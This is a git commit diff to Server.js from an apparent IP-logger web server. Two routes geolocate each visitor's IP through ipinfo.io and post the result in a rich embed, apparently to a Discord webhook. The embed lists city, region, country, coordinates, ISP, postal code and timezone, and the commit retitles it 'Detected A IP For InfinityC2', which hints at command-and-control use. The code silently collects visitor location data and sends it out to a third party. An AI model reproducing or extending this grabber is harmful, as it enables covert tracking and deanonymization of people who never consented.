3c9a1567a5cd4476e7dec303f61caf6dc08b62f7
Wurst <minegamer30k@gmail.com>
2026-04-06 00:46:00 +0530

    Update Server.js

--- Server.js
+++ Server.js
@@ -78,7 +78,7 @@ app.get("/", (req, res) => {
                         "embeds": [
                             {
                                 "type": "rich",
-                                "title": `${ip}`,
+                                "title": `Detected A IP For InfinityC2`,
                                 "description": `IP: ${ip}\nCity: ${ipinfo['city']}\nRegion: ${ipinfo['region']}\nCountry: ${ipinfo['country']}\nLocation: ${ipinfo['loc']}\nORG: ${ipinfo['org']}\nPostal: ${ipinfo['postal']}\nTimeZone: ${ipinfo['timezone']}\n`,
                                 "color": 0x00FFFF,
                                 "url": `https://ipinfo.io/${ip}`
@@ -139,7 +139,7 @@ app.get("/:id", (req, res) => {
                                 "embeds": [
                                     {
                                         "type": "rich",
-                                        "title": `Detected A IP for Website!`,
+                                        "title": `Detected A IP For InfinityC2`,
                                         "description": `IP: ${ip}\nFrom ${id}\nCity: ${ipinfo['city']}\nRegion: ${ipinfo['region']}\nCountry: ${ipinfo['country']}\nLocation: ${ipinfo['loc']}\nORG: ${ipinfo['org']}\nPostal: ${ipinfo['postal']}\nTimeZone: ${ipinfo['timezone']}\n`,
                                         "color": 0x00FFFF,
                                         "url": `https://ipinfo.io/${ip}`
